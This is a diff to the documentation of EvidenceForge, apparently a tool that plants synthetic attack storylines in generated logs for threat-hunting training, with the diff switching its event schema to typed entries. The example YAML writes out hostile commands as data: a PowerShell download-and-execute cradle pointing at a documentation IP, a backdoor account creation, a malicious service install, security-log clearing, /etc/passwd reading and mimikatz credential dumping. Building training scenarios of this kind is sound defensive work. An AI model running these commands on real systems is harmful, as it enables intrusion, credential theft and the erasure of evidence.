@@ -53,7 +53,7 @@ Multiple attackers and parallel attack paths are supported — for example, an e
 
 ### Persona Selection
 
-EvidenceForge includes a library of 15 pre-built personas in the `personas/` directory (located alongside this skill file). Read the YAML files for full details when creating a scenario.
+EvidenceForge includes a library of 15 pre-built personas that are resolved automatically by name. Reference them in user definitions without defining them inline — the validator and engine resolve them from the built-in library. Only define personas inline if you need to customize behavior. Read the YAML files in `personas/` for full details.
 
 | Persona | Work Hours | Risk Profile | Typical Role |
 |---------|-----------|--------------|-------------|
@@ -193,7 +193,7 @@ environment:
         monitoring_segments: [corporate_lan]
         direction: bidirectional  # bidirectional | inbound | outbound
         placement: span           # span (sees intra-segment) | tap (cross-segment only)
-        log_formats: [zeek_conn]
+        log_formats: [zeek]
 
 personas:                         # Define inline or reference pre-built from personas/
   - name: developer
@@ -218,17 +218,18 @@ storyline:                        # The attack events to bury in the data
   - time: "+2h"                   # Relative offset from start, or absolute ISO 8601
     actor: marcus.chen            # Username of compromised account (or system account)
     system: WS-DEV-01             # Must reference existing hostname
-    activity: "Description of what happens"
-    details:                      # Flexible dict — activity-specific fields
-      source_ip: "203.0.113.50"
-      command_line: "whoami"
-      technique: "T1033 - System Owner/User Discovery"
+    activity: "Recon: enumerate current user"  # Human-readable (for GROUND_TRUTH.md only)
+    events:                       # Typed event declarations — validated per-type fields
+      - type: process
+        process_name: "C:\\Windows\\System32\\whoami.exe"
+        command_line: "whoami"
+        technique: "T1033 - System Owner/User Discovery"
 
 output:
   logs:
-    - format: windows_event_security
-    - format: zeek_conn
-    # Available: windows_event_security, zeek_conn, ecar, syslog,
+    - format: windows
+    - format: zeek
+    # Available: windows, zeek, ecar, syslog,
     #            bash_history, snort_alert, web_access
   destination: "./output"
   compression: false
@@ -237,11 +238,13 @@ output:
 ### OS-Aware Log Routing
 
 The `os` field on systems determines which native log formats are generated:
-- **Windows** (Windows 10, Windows 11, Windows Server 2019, etc.) → Windows Event Security logs
+- **Windows** (Windows 10, Windows 11, Windows Server 2019, etc.) → Windows Event Security logs + Sysmon
 - **Linux** (Ubuntu, CentOS, Debian, RHEL, etc.) → syslog + bash_history
 - **eCAR** → Optional EDR/XDR layer, works on any OS (only emitted if in output logs list)
 - **Zeek, Snort** → Network-level, OS-agnostic (driven by network sensor configuration)
 - **web_access** → Generated for systems running web services
+
+See `references/evidence-formats.md` for detailed field documentation, output paths, and known limitations for each log format.
 
 ### Validation Rules
 
@@ -272,39 +275,64 @@ The storyline is the most important part — it's what the threat hunter will be
 
 Not every scenario needs all phases — an insider threat won't have privilege escalation if they already have access, a ransomware attack emphasizes impact over exfiltration. But actively consider each phase and include it when it makes the attack realistic. Omitting privilege escalation or persistence from an external attacker scenario is a common gap that makes the storyline feel incomplete.
 
-When building storyline events, be technically specific because the engine uses these details directly:
+When building storyline events, each entry needs an `events` list with typed declarations. Be technically specific — the engine uses these fields directly.
 
-**For process execution events:**
+**Available event types:** `process`, `logon`, `failed_logon`, `logoff`, `connection`, `ssh_session`, `rdp_session`, `account_created`, `account_deleted`, `group_member_added`, `service_installed`, `scheduled_task_created`, `log_cleared`, `create_remote_thread`, `raw`
+
+The `raw` type targets a specific output format with arbitrary fields — use it for events without a dedicated type (e.g., custom syslog messages, specific Windows events). Requires `target_format` and `fields` dict. Raw events bypass cross-format correlation, so prefer typed events when available.
+
+**Process execution:**
 ```yaml
-details:
-  process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-  command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')\""
-  technique: "T1059.001 - PowerShell"
+events:
+  - type: process
+    process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')\""
+    technique: "T1059.001 - PowerShell"
 ```
 
-**For network connections:**
+**Network connections (C2, exfiltration):**
 ```yaml
-details:
-  dst_ip: "198.51.100.10"
-  dst_port: 443
-  service: "https"
-  technique: "T1071.001 - Web Protocols"
+events:
+  - type: connection
+    dst_ip: "198.51.100.10"
+    dst_port: 443
+    service: "ssl"
+    technique: "T1071.001 - Web Protocols"
 ```
 
-**For authentication events:**
+**Authentication (logon/failed logon):**
 ```yaml
-details:
-  source_ip: "10.0.1.50"
-  logon_type: 3    # 3=network, 10=RDP, 2=interactive
-  technique: "T1078 - Valid Accounts"
+events:
+  - type: logon
+    source_ip: "10.0.1.50"
+    logon_type: 3    # 3=network, 10=RDP, 2=interactive
+    technique: "T1078 - Valid Accounts"
 ```
 
-**For Linux commands:**
+**SSH/RDP lateral movement (compound events — produces network + host logs):**
 ```yaml
-details:
-  command: "cat /etc/passwd"
-  technique: "T1087.001 - Account Discovery: Local Account"
+events:
+  - type: ssh_session   # or rdp_session
+    source_ip: "10.0.1.50"
+    technique: "T1021.004 - Remote Services: SSH"
 ```
+
+**Linux commands (use process type with Linux binary paths):**
+```yaml
+events:
+  - type: process
+    process_name: "/usr/bin/cat"
+    command_line: "cat /etc/passwd"
+    technique: "T1087.001 - Account Discovery: Local Account"
+```
+
+**Correlated events for process commands:** When a storyline step runs a command that would produce additional audit events (account creation, service installation, scheduled task creation, log clearing, process injection, etc.), explicitly declare those as separate events in the same step's `events` list alongside the `process` event. Think about what audit trail the command would leave in a real environment and declare each distinct event. For example:
+- `net user backdoor P@ss /add` → declare both `process` and `account_created` (with `target_username`)
+- `sc create evilsvc binPath=...` → declare both `process` and `service_installed` (with `service_name` and `service_file_name`)
+- `wevtutil cl Security` → declare both `process` and `log_cleared`
+- mimikatz credential dumping → declare `process` and `create_remote_thread` (with `target_process: lsass.exe`)
+
+The engine auto-infers 6 common Windows command patterns as a safety net, but do not rely on this -- always declare correlated events explicitly.
 
 Use RFC 5737 documentation IP ranges for external attacker IPs (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24). Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems.
 
@@ -324,7 +352,7 @@ echo -n 'cat /etc/passwd' | base64
 
 Always generate the encoded string via Bash and paste the real output into the scenario YAML. A threat hunter who decodes the base64 should find the actual command inside.
 
-For the `time` field, prefer relative offsets from the scenario start ("+15m", "+1h30m", "+2h") — they're easier to read and relocatable. Space events realistically: real attackers pause between steps, but don't drag reconnaissance over 6 hours either.
+For the `time` field, prefer relative offsets from the scenario start ("+15m", "+1h30m", "+2h") — they're easier to read and relocatable. Units supported: `d` (days), `h` (hours), `m` (minutes), `s` (seconds), `ms` (milliseconds). Use seconds/milliseconds for rapid sequences like password sprays ("+20m30s", "+20m30s500ms"). Space events realistically: real attackers pause between steps, but don't drag reconnaissance over 6 hours either.
 
 ## ENVIRONMENT.md — Student Context Document
 
@@ -431,7 +459,7 @@ Before finalizing the scenario, verify that every storyline event is **discovera
 **Check each storyline event against these rules:**
 
 1. **Host log coverage** — The system where the event occurs must have at least one matching log format enabled in `output.logs`:
-   - Windows systems need `windows_event_security` (or `ecar`) for logon/process events
+   - Windows systems need `windows` (or `ecar`) for logon/process events
    - Linux systems need `syslog` and/or `bash_history` for authentication and command execution
    - If a system's OS doesn't match any enabled format, the event will produce no host-level traces
 
